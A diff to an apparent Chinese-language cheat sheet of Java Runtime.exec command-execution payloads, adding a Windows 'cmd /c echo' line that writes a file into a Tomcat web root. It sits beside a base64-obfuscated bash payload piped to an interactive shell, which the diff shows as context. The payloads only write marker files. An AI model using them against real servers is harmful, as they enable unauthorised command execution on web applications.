@@ -17,6 +17,12 @@ https://www.bugku.net/runtime-exec-payloads/
 bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
 ```
 
+Windows下
+```
+getRuntime().exec(\"cmd /c echo 1 > D://tomcat//webapps//ROOT//90s.txt\");
+```
+
+
 ## 命令执行，定位资源文件写文件回显
 Linux
 ```
